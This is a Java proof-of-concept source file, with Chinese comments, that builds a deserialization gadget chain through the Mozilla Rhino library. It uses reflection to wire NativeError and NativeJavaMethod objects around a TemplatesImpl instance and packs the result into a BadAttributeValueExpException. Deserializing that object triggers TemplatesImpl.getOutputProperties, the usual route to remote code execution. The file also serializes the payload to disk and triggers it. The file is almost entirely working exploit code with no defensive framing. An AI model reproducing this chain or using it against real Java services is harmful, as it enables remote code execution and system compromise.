package com.xiang.rhinotest;

import java.io.*;
import java.lang.reflect.*;

import javax.management.BadAttributeValueExpException;

import org.mozilla.javascript.*;

import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;

public class RhinoPoc 
{
    public static void main( String[] args ) throws Exception {
        poc();
    }

    private static void poc() throws Exception {
    	File serFile = new File("ser.txt");
    	//serialize(serFile);
    	deserialize(serFile);
    }
    
    private static void serialize(File file) throws Exception {
    	Object obj = generate_Object();
    	ObjectOutputStream out = new ObjectOutputStream(new FileOutputStream(file));
    	out.writeObject(obj);
    	out.close();
    }
    
    private static void deserialize(File file) throws Exception {
    	ObjectInputStream in = new ObjectInputStream(new FileInputStream(file));
    	in.readObject();
    	in.close();
    }
    
    private static Object generate_Object() throws Exception {
    	//		构造 NativeError 对象 a
    	Object nativeError;
    	{
    		Class<?> cls = Class.forName("org.mozilla.javascript.NativeError");
    		Constructor<?> cons = cls.getDeclaredConstructor();
    		cons.setAccessible(true);
    		nativeError = cons.newInstance();
    	}
    	
    	//		构造 NativeJavaObject 对象 o
    	//		设置 o 的成员变量 javaObject 为目标对象
    	//		设置 a 的成员变量 prototypeObject 为 o
    	TemplatesImpl templatesImpl = TemplatesImplGadget.get();
    	{
        	Context context = Context.enter();
            NativeObject scriptableObject = (NativeObject) context.initStandardObjects();
        	NativeJavaObject nativeJavaObject = new NativeJavaObject(scriptableObject, templatesImpl, TemplatesImpl.class);
    		Method method = nativeError.getClass().getMethod("setPrototype", new Class<?>[]{Scriptable.class});
    		method.invoke(nativeError, new Object[]{nativeJavaObject});
    	}

    	//		构造 MemberBox 对象 m
    	//		设置 m 的成员变量 memberObject 为目标函数
    	//		构造 NativeJavaMethod 对象 n
    	//		设置 n 的成员变量 methods 的 0 号元素为 m   
    	//		通过 a 的 setGetterOrSetter() 函数，设置 a 的 getter 属性为对象 n
    	Method getOutputProperties = templatesImpl.getClass().getMethod("getOutputProperties", new Class<?>[0]);
    	{ 
    		NativeJavaMethod nativeJavaFunction = new NativeJavaMethod(getOutputProperties, null);
    		Method method = nativeError.getClass().getMethod("setGetterOrSetter", new Class<?>[]{String.class, int.class, Callable.class, boolean.class});
			method.invoke(nativeError, new Object[]{"message", 0, nativeJavaFunction, false});
    	}

    	//		构造 MemberBox 对象 m2
    	//		设置 m2 的成员变量 memberObject 为 Context.enter()
    	//		构造 NativeJavaMethod 对象 n2
    	//		设置 n2 的成员变量 methods 的 0 号元素为 m2   
    	//		通过 a 的 setGetterOrSetter() 函数，设置 a 的 getter 属性为对象 n2
        Method enterMethod = Context.class.getMethod("enter", new Class<?>[0]);
    	{
    		NativeJavaMethod nativeJavaFunction = new NativeJavaMethod(enterMethod, null);
    		Method method = nativeError.getClass().getMethod("setGetterOrSetter", new Class<?>[]{String.class, int.class, Callable.class, boolean.class});
			method.invoke(nativeError, new Object[]{"name", 0, nativeJavaFunction, false});
    	}
    	//		通过反射强行设置 getter 属性为 MemberBox 对象的 Context.enter() 函数
    	{
    		Method getSlot = ScriptableObject.class.getDeclaredMethod("getSlot", new Class<?>[]{String.class, int.class, int.class});
    		getSlot.setAccessible(true);
    		Object slot  = getSlot.invoke(nativeError, "name", 0, 1);
    		Field getter = slot.getClass().getDeclaredField("getter");
    		getter.setAccessible(true);

            Class<?> memberboxClass = Class.forName("org.mozilla.javascript.MemberBox");
            Constructor<?> memberboxClassConstructor = memberboxClass.getDeclaredConstructor(Method.class);
            memberboxClassConstructor.setAccessible(true);
            Object memberboxes = memberboxClassConstructor.newInstance(enterMethod);
    		getter.set(slot, memberboxes);
    	}
    	
    	//    	构造 BadAttributeValueExpException 对象 b
    	//    	设置 b 的成员变量 val 为 NativeError 对象 a
        BadAttributeValueExpException badAttributeValueExpException = new BadAttributeValueExpException(null); 
        {
        	Field valField = badAttributeValueExpException.getClass().getDeclaredField("val");
        	valField.setAccessible(true);
        	valField.set(badAttributeValueExpException, nativeError);
        }
    	return badAttributeValueExpException;
    }
}
